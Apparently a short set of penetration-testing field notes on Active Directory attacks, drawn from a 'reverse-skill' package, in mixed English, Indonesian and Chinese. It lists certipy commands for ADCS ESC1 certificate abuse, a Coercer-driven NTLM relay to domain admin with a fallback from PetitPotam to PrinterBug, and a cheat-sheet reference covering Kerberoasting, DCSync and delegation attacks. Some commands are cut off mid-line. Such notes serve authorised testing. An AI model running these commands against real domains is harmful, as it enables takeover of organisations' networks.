# Windows / Active Directory

_Source: reverse-skill package (zhaoxuya520/reverse-skill) + field-journal (43 real cases). Extracted 2026-10-21._

## Technique headings
- (see reverse-skill package section below)


## reverse-skill field-journal (2026-10-21 — 3 kasus nyata)

- **seed-005_ad-certipy-esc1**
  - certipy find -u user@domain.local -p 'Password123' -dc-ip 10.0.0.1
  - certipy req -u user@domain.local -p 'Password123' \
  - certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
  - | certipy find 超时 | LDAP 连接被防火墙拦截 | 改用 -ns 参数指定 DNS | 20min |
- **seed-007_ntlm-relay-coercer**
  - [2026-04] NTLM Relay + Coercer → 域管权限（无需密码）
  - coercer coerce -u '' -p '' -d domain.local \
  - | Coercer 无法触发认证 | 目标 DC 已打补丁禁用 PetitPotam | 换用 PrinterBug（MS-RPRN） | 30min |
  - Coercer 比手动调用 PetitPotam 更方便，自动尝试多种协议
- **seed-013_kerberoasting-spn**
  - 增加 `pentest-tools/references/ad-cheatsheet.md` 把 6 大 AD 攻击（Kerberoasting / AS-REP / DCSync / DCShadow / Constrained Delegation / Resource-Based Constrained Delegation / ESC1-ESC15）一页搞定
